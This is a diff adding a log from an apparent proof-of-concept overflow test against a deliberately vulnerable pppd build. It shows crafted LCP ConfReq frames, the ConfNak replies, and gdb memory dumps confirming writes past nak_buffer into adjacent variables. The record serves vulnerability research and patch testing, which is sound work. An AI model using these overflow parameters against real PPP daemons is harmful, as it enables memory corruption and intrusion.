@@ -1,0 +1,17 @@
+=== w123-plain-t1500 ===
+binary=build-vuln-plain/pppd/pppd
+target_offset=1500
+pap_cis=8 async_cis=244
+info_len=1500 nak_bytes=1504
+ci_value=50574e32 expected_nak_value=50574e33
+process_rc=None survived_window=True
+frame_sha256=a882cf149e3130942919064834e096a54fbcd77247ee0b7347f4a53fbd58e048
+rcvd [LCP ConfReq: rcvd [LCP ConfReq id=0x1 <auth pap> <auth pap> <auth pap> <auth pap> <auth pap> <auth pap> <auth pap> <auth pap> <asyncmap 0x50574e32> <asyncmap 0x50574e32> <asyncmap 0x50574e32> <asyncmap 0x50574e32> <asyncmap 0x50574e32> <asyncm
+sent [LCP ConfNak: sent [LCP ConfNak id=0x1 <auth chap MD5> <auth chap MD5> <auth chap MD5> <auth chap MD5> <auth chap MD5> <auth chap MD5> <auth chap MD5> <auth chap MD5> <asyncmap 0x50574e33> <asyncmap 0x50574e33> <asyncmap 0x50574e33> <asyncmap 0
+gdb_memory:
+  0xADDR <nak_buffer+1492>:	0x02	0x06	0x50	0x57	0x4e	0x33	0x02	0x06
+  0xADDR <last_pkts_in.0>:	0x50	0x57	0x4e	0x33
+  0xADDR <ifname>:	0x70	0x70	0x70	0x30	0x00	0x00	0x00	0x00
+  0xADDR <ifname+8>:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+  0xADDR <the_channel>:	0xADDR
+  $1 = 0x1
